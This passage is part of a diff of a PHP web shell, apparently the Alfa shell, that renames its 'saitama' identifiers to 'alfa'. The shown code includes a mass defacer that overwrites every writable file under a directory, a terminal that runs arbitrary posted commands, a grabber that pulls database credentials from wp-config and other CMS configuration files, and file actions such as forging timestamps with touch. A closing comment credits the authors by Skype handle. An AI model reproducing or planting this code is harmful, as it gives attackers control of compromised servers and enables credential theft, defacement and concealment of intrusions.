 <input type="submit" name="btn" value=" "></div></form></center><br>';
-$dir = $_POST['saitama2'];
-$string = $_POST['saitama3'];
-$ext = $_POST['saitama5'];
-if(!empty($string) AND !empty($dir) AND $_POST['saitama4'] == '>>'){
+$dir = $_POST['alfa2'];
+$string = $_POST['alfa3'];
+$ext = $_POST['alfa5'];
+if(!empty($string) AND !empty($dir) AND $_POST['alfa4'] == '>>'){
 echo __pre();
-saitama_StrSearcher($dir,$string,$ext,$_POST['saitama6']);
+Alfa_StrSearcher($dir,$string,$ext,$_POST['alfa6']);
 }
 }
 echo '</div>';
-saitamafooter();
+alfafooter();
 }
-function saitamaMassDefacer(){
-saitamahead();
-saitamaNum(5,6,7,8,9,10);
+function alfaMassDefacer(){
+alfahead();
+AlfaNum(5,6,7,8,9,10);
 echo "<div class=header><center><p><div class='txtfont_header'>| Mass Defacer |</div></p><form onSubmit=\"g('MassDefacer',null,this.massdir.value,this.defpage.value,this.method.value,'>>');return false;\" method='post'>";
 echo '<div class="txtfont">Deface Method: <select name="method"><option value="index">Deface Index Dirs</option><option value="all">All Files</option></select>
 	Mass dir: <input size="50" id="target" type="text" name="massdir" value="'.htmlspecialchars($GLOBALS['cwd']).'">
 	DefPage: <input size="50" type="text" name="defpage" value="'.htmlspecialchars($GLOBALS['cwd']).'"></div> <input type="submit" name="btn" value=" "></center></p>
 </form>';
-$dir = $_POST['saitama1'];
-$defpage = $_POST['saitama2'];
-$method = $_POST['saitama3'];
+$dir = $_POST['alfa1'];
+$defpage = $_POST['alfa2'];
+$method = $_POST['alfa3'];
 $fCurrent = $GLOBALS['__file_path'];
-if($_POST['saitama4'] == '>>'){
+if($_POST['alfa4'] == '>>'){
 if(!empty($dir)){
 if(@is_dir($dir)){
 if(@is_readable($dir)){
@@ -5966,11 +5967,11 @@ if($file == '..' || $file == '.')continue;
 $newfile=$dir.$file;
 if($fCurrent == $newfile)continue;
 if(@is_dir($newfile)){
-saitama_ReadDir($newfile,$method,$defpage);
+Alfa_ReadDir($newfile,$method,$defpage);
 }else{
 if(!@is_writable($newfile))continue;
 if(!@is_readable($newfile))continue;
-saitama_Rewriter($newfile,$file,$defpage,$method);
+Alfa_Rewriter($newfile,$file,$defpage,$method);
 }
 }
 closedir($dh);
@@ -5981,26 +5982,26 @@ closedir($dh);
 }else{__alert('<font color="red">Dir is Empty...</font>');}
 }
 echo '</div>';
-saitamafooter();
+alfafooter();
 }
-function saitama_ReadDir($dir,$method='',$defpage=''){
+function Alfa_ReadDir($dir,$method='',$defpage=''){
 if(!@is_readable($dir)) return false;
 if (@is_dir($dir)) {
 if ($dh = @opendir($dir)) {
 while(($file=readdir($dh))!==false) {
 if($file == '..' || $file == '.')continue;
 $newfile=$dir.'/'.$file;
-if(@is_readable($newfile)&&@is_dir($newfile))saitama_ReadDir($newfile,$method,$defpage);
+if(@is_readable($newfile)&&@is_dir($newfile))Alfa_ReadDir($newfile,$method,$defpage);
 if(@is_file($newfile)){
 if(!@is_readable($newfile))continue;
-saitama_Rewriter($newfile,$file,$defpage,$method);
+Alfa_Rewriter($newfile,$file,$defpage,$method);
 }
 }
 closedir($dh);
 }
 }
 }
-function saitama_Rewriter($dir,$file,$defpage,$m='index'){
+function Alfa_Rewriter($dir,$file,$defpage,$m='index'){
 if(!@is_writable($dir)) return false;
 if(!@is_readable($dir)) return false;
 $defpage=@file_get_contents($defpage);
@@ -6015,8 +6016,8 @@ echo @is_file($dir)?$dir."<b><font color='red'>DeFaced...</b></font><br>" : '';
 echo @is_file($dir)?$dir."  <b><font color='red'>DeFaced...</b></font><br>" : '';
 }
 }
-function saitamaGetDisFunc(){
-saitamahead();
+function alfaGetDisFunc(){
+alfahead();
 echo '<div class="header">';
 $disfun = @ini_get('disable_functions');
 $s = explode(',',$disfun);
@@ -6032,9 +6033,9 @@ $i++;
 }
 echo '</table></center>';
 echo '</div>';
-saitamafooter();
+alfafooter();
 }
-function saitama_Create_A_Tag($action,$vals){
+function Alfa_Create_A_Tag($action,$vals){
 $nulls = array();
 foreach($vals as $key => $val){
 echo '<a href=javascript:void(0) onclick="g(\''.$action.'\',';
@@ -6044,7 +6045,7 @@ echo $f.',\''.$val[0].'\');return false;">| '.$key.' | </a>';
 unset($nulls);
 }
 }
-function saitama_Searcher($dir, $ext, $method) {
+function Alfa_Searcher($dir, $ext, $method) {
 if(@is_readable($dir)){
 if($method == 'all')$ext = '*';
 if($method == 'dirs')$ext = '*';
@@ -6053,7 +6054,7 @@ $globDirs  = @glob("$dir/*", GLOB_ONLYDIR);
 $blacklist = array();
 foreach ($globDirs as $dir) {
 if(!@is_readable($dir)||@is_link($dir)) continue;
-@saitama_Searcher($dir, $ext, $method);
+@Alfa_Searcher($dir, $ext, $method);
 }
 switch($method){
 case "files":
@@ -6080,10 +6081,10 @@ break;
 unset($blacklist);
 }
 }
-function saitamaiFrameCreator($f,$width='100%',$height='600px'){
-return('<iframe src="'.__SAITAMA_DATA_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
+function AlfaiFrameCreator($f,$width='100%',$height='600px'){
+return('<iframe src="'.__ALFA_DATA_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
 }
-class saitamaCURL {
+class AlfaCURL {
 public $headers;
 public $user_agent;
 public $compression;
@@ -6098,14 +6099,14 @@ $this->headers[] = 'Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg';
 $this->headers[] = 'Connection: Keep-Alive';
 $this->headers[] = 'Content-type: application/x-www-form-urlencoded;charset=UTF-8';
 $this->user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36)';
-$this->path = saitama_TEMPDIR.'/saitama_cookies.txt';
+$this->path = ALFA_TEMPDIR.'/Alfa_cookies.txt';
 $this->compression=$compression;
 $this->proxy=$proxy;
 $this->cookies=$cookies;
 if($this->cookies)$this->cookie($this->path);
 }
 function cookie($cookie_file) {
-if (_saitama_file_exists($cookie_file,false)) {
+if (_alfa_file_exists($cookie_file,false)) {
 $this->cookie_file=$cookie_file;
 }else{
 @fopen($cookie_file,'w') or die($this->error('The cookie file could not be opened.'));
@@ -6220,7 +6221,7 @@ function json_decode($json, $array=true){
     return $x;
 }
 }
-function saitamaterminalExec(){
+function alfaterminalExec(){
 	$pwd = "pwd";
 	$seperator = ";";
 	if($GLOBALS['sys']!='unix'){
@@ -6229,14 +6230,14 @@ function saitamaterminalExec(){
 	}
 	if($GLOBALS["glob_chdir_false"]&&!empty($_POST["c"])){$cmd = "cd '".addslashes($_POST["c"])."'".$seperator;}
 	$current_path = '';
-	if(preg_match("/cd[ ]{0,}(.*)[ ]{0,}".$seperator."|cd[ ]{0,}(.*)[ ]{0,}/i", $_POST['saitama1'], $match)){
+	if(preg_match("/cd[ ]{0,}(.*)[ ]{0,}".$seperator."|cd[ ]{0,}(.*)[ ]{0,}/i", $_POST['alfa1'], $match)){
 		if(empty($match[1])){
 			$match[1] = $match[2];
 		}
-		$current_path = saitamaEx("cd ".addslashes($match[1]).$seperator.$pwd);
+		$current_path = alfaEx("cd ".addslashes($match[1]).$seperator.$pwd);
 		$current_path = str_replace("\\", "/", $current_path);
 	}
-	$out = saitamaEx($cmd.$_POST['saitama1'], true);
+	$out = alfaEx($cmd.$_POST['alfa1'], true);
 	$out = htmlspecialchars($out);
 	echo json_encode(array("output" => convertBash($out), "path" => $current_path));
 }
@@ -6255,22 +6256,22 @@ function convertBash($code) {
     $htmlString = str_replace(array_keys($dictionary), $dictionary, $code);
     return $htmlString;
 }
-function saitamadoActions(){
+function alfadoActions(){
 	$chdir_fals = false;
 	if(!@chdir($_POST['c'])){
 		$chdir_fals = true;
-		$saitama_canruncmd = _saitama_can_runCommand(true,true);
+		$alfa_canruncmd = _alfa_can_runCommand(true,true);
 	}
-	if(isset($_POST['saitama1']))$_POST['saitama1'] = rawurldecode($_POST['saitama1']);
-	if(isset($_POST['saitama2']))$_POST['saitama2'] = rawurldecode($_POST['saitama2']);
-	$action = $_POST["saitama3"];
+	if(isset($_POST['alfa1']))$_POST['alfa1'] = rawurldecode($_POST['alfa1']);
+	if(isset($_POST['alfa2']))$_POST['alfa2'] = rawurldecode($_POST['alfa2']);
+	$action = $_POST["alfa3"];
 	if($action == "permission"){
 		$perms = 0;
-		$perm = $_POST["saitama2"];
+		$perm = $_POST["alfa2"];
 		for($i=strlen($perm)-1;$i>=0;--$i){
 			$perms += (int)$perm[$i]*pow(8, (strlen($perm)-$i-1));
 		}
-		if(@chmod($_POST['saitama1'], $perms)){
+		if(@chmod($_POST['alfa1'], $perms)){
 			echo("done");
 		}else{
 			echo("no");
@@ -6278,26 +6279,26 @@ function saitamadoActions(){
 		return;
 	}
 	if($action == "rename" || $action == "move"){
-		$saitama1_decoded = $_POST['saitama1'];
+		$alfa1_decoded = $_POST['alfa1'];
 		if($chdir_fals){
-			$_POST['saitama1'] = $_POST["c"]."/".$_POST["saitama1"];
+			$_POST['alfa1'] = $_POST["c"]."/".$_POST["alfa1"];
 		}
-		$_POST['saitama1'] = trim($_POST['saitama1']);
-		$saitama1_escape = addslashes($_POST["saitama1"]);
-		if($_POST["saitama3"] == "rename"){
-			$_POST['saitama2'] = basename($_POST['saitama2']);
+		$_POST['alfa1'] = trim($_POST['alfa1']);
+		$alfa1_escape = addslashes($_POST["alfa1"]);
+		if($_POST["alfa3"] == "rename"){
+			$_POST['alfa2'] = basename($_POST['alfa2']);
 		}
-		if(!empty($_POST['saitama2'])){
+		if(!empty($_POST['alfa2'])){
 			$cmd_rename = false;
-			if($chdir_fals&&$saitama_canruncmd){
-				if(_saitama_is_writable($_POST['saitama1'])){
+			if($chdir_fals&&$alfa_canruncmd){
+				if(_alfa_is_writable($_POST['alfa1'])){
 					$cmd_rename = true;
-					$saitama1_escape = addslashes($saitama1_decoded);
-					saitamaEx("cd '".addslashes($_POST['c'])."';mv '".$saitama1_escape."' '".addslashes($_POST['saitama2'])."'");
+					$alfa1_escape = addslashes($alfa1_decoded);
+					alfaEx("cd '".addslashes($_POST['c'])."';mv '".$alfa1_escape."' '".addslashes($_POST['alfa2'])."'");
 				}
 			}
-			if(!file_exists($_POST['saitama2'])){
-				if(@rename($_POST['saitama1'], $_POST['saitama2'])||$cmd_rename){
+			if(!file_exists($_POST['alfa2'])){
+				if(@rename($_POST['alfa1'], $_POST['alfa2'])||$cmd_rename){
 					echo "done";
 				}else{
 					echo "no";
@@ -6307,8 +6308,8 @@ function saitamadoActions(){
 			}
 		}
 	}elseif($action == "copy"){
-		if(is_dir($_POST["saitama1"])){
-			$dir = str_replace('//', '/', $_POST["saitama1"]);
+		if(is_dir($_POST["alfa1"])){
+			$dir = str_replace('//', '/', $_POST["alfa1"]);
 			$dir = explode('/', $dir);
 			if(empty($dir[count($dir) - 1])){
 				$name = $dir[count($dir) - 2];
@@ -6316,32 +6317,32 @@ function saitamadoActions(){
 				$name = $dir[count($dir) - 1];
 			}
 		}else{
-			$name = basename($_POST["saitama1"]);
+			$name = basename($_POST["alfa1"]);
 		}
-		$dir = dirname($_POST["saitama1"]);
+		$dir = dirname($_POST["alfa1"]);
 		if($dir == "."){
 			$dir = $_POST["c"]."/";
 		}
-		if(is_file($_POST["saitama1"])){
-			@copy($_POST["saitama1"], $_POST["saitama2"]);
+		if(is_file($_POST["alfa1"])){
+			@copy($_POST["alfa1"], $_POST["alfa2"]);
 			echo("done");
-		}elseif(is_dir($_POST["saitama1"])){
-			if(!is_dir($_POST["saitama2"])){
-				mkdir($_POST["saitama2"], 0755, true);
+		}elseif(is_dir($_POST["alfa1"])){
+			if(!is_dir($_POST["alfa2"])){
+				mkdir($_POST["alfa2"], 0755, true);
 			}
-			copy_paste($dir, $name , $_POST["saitama2"] . "/");
+			copy_paste($dir, $name , $_POST["alfa2"] . "/");
 			echo("done");
 		}
 	}elseif($action == "modify"){
-		if( !empty($_POST['saitama1']) ) {
-			$time = strtotime($_POST['saitama1']);
+		if( !empty($_POST['alfa1']) ) {
+			$time = strtotime($_POST['alfa1']);
 			if($time){
 				$touched = false;
-				if($chdir_fals&&$saitama_canruncmd){
-					saitamaEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['saitama1']))."' '".addslashes($_POST['saitama2'])."'");
+				if($chdir_fals&&$alfa_canruncmd){
+					alfaEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['alfa1']))."' '".addslashes($_POST['alfa2'])."'");
 					$touched = true;
 				}
-				if(!@touch($_POST['saitama2'],$time,$time)&&!$touched){
+				if(!@touch($_POST['alfa2'],$time,$time)&&!$touched){
 					echo 'no';
 				}else{
 					echo 'ok';
@@ -6353,10 +6354,10 @@ function saitamadoActions(){
 	}
 
 }
-function saitamaget_flags(){
+function alfaget_flags(){
 	$flags = array();
 	if(function_exists("curl_version")){
-		$curl = new saitamaCURL();
+		$curl = new AlfaCURL();
 		$server_addr = (!@$_SERVER["SERVER_ADDR"]?(function_exists("gethostbyname")?@gethostbyname($_SERVER['SERVER_NAME']):'????'):@$_SERVER["SERVER_ADDR"]);
 		$flag = $curl->Send("http://www.geoplugin.net/json.gp?ip=" . $server_addr);
 		$flag2 = $curl->Send("http://www.geoplugin.net/json.gp?ip=" . $_SERVER["REMOTE_ADDR"]);
@@ -6375,9 +6376,9 @@ function saitamaget_flags(){
 	}
 	echo json_encode($flags);
 }
-function saitamaGetConfig(){
-$cms = $_POST['saitama1'];
-$path = trim($_POST['saitama2']);
+function alfaGetConfig(){
+$cms = $_POST['alfa1'];
+$path = trim($_POST['alfa2']);
 $config = array(
 'wp'=>array('file'=>'/wp-config.php',
 'host'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOST(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
@@ -6453,7 +6454,7 @@ $config = array(
 if($cms == "drupal"){
 	$file = $config[$cms]['file'];
 	$file=$path.$file;
-	if(@is_file($file)||_saitama_is_dir($file,"-e")){
+	if(@is_file($file)||_alfa_is_dir($file,"-e")){
 	}else{
 		$cms = 'drupal2';
 	}
@@ -6461,7 +6462,7 @@ if($cms == "drupal"){
 if($cms == "vb"){
 	$file = $config[$cms]['file'];
 	$file=$path.$file;
-	if(@is_file($file)||_saitama_is_dir($file,"-e")){
+	if(@is_file($file)||_alfa_is_dir($file,"-e")){
 	}else{
 		$path .= '/core';
 	}
@@ -6478,9 +6479,9 @@ $cuser = $config[$cms]['dbuser'][1];
 $cname = $config[$cms]['dbname'][1];
 $cpw = $config[$cms]['dbpw'][1];
 $cprefix = $config[$cms]['prefix'][1];
-if(@is_dir($path)||_saitama_is_dir($path)){
+if(@is_dir($path)||_alfa_is_dir($path)){
 $file=$path.$file;
-}elseif(@is_file($path)||_saitama_is_dir($path,"-e")){
+}elseif(@is_file($path)||_alfa_is_dir($path,"-e")){
 $file=$path;
 }else{
 return false;
@@ -6516,16 +6517,16 @@ $data['cc_encryption_hash'] = $mach[3];
 echo json_encode($data);
 }
 if(empty($_POST['a']))
-if(isset($default_action) && function_exists('saitama' . $default_action))
+if(isset($default_action) && function_exists('alfa' . $default_action))
 $_POST['a'] = $default_action;
 else
 $_POST['a'] = 'FilesMan2';//'FilesMan';
-if(!empty($_POST['a']) && function_exists('saitama' . $_POST['a']))
-call_user_func('saitama' . $_POST['a']);
+if(!empty($_POST['a']) && function_exists('alfa' . $_POST['a']))
+call_user_func('alfa' . $_POST['a']);
 exit;
 /*
 #Persian Gulf For Ever
 #skype : sole.sad
-#skype : ehsan.StrezzBoy
+#skype : ehsan.invisible
 */
 ?>
